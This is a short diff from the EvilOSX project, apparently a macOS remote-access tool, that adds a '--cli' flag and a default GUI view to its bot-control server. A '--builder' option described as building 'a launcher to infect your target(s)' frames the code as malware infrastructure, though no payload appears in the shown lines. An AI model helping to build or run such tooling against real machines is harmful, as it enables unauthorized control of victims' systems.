@@ -13,7 +13,6 @@ from bot import launchers, loaders
 from server.handler import start_server
 from server.model import Model
 from server.version import VERSION
-from server.view.cli import ViewCLI
 
 BANNER = """\
 ▓█████ ██▒   █▓ ██▓ ██▓     ▒█████    ██████ ▒██   ██▒
@@ -117,6 +116,7 @@ def builder():
 def main():
     parser = ArgumentParser()
     parser.add_argument("-p", "--port", help="server port to listen on", type=int)
+    parser.add_argument("--cli", help="show the command line interface", action="store_true")
     parser.add_argument("--builder", help="build a launcher to infect your target(s)", action="store_true")
     parser.add_argument("--no-banner", help="prevents the EvilOSX banner from being displayed", action="store_true")
 
@@ -146,7 +146,12 @@ def main():
                 continue
 
     model = Model()
-    view = ViewCLI(model, server_port)
+    if arguments.cli:
+        from server.view.cli import ViewCLI
+        view = ViewCLI(model, server_port)
+    else:
+        from server.view.gui import ViewGUI
+        view = ViewGUI(model, server_port)
 
     # Start handling bot requests
     start_server(model, view, server_port)
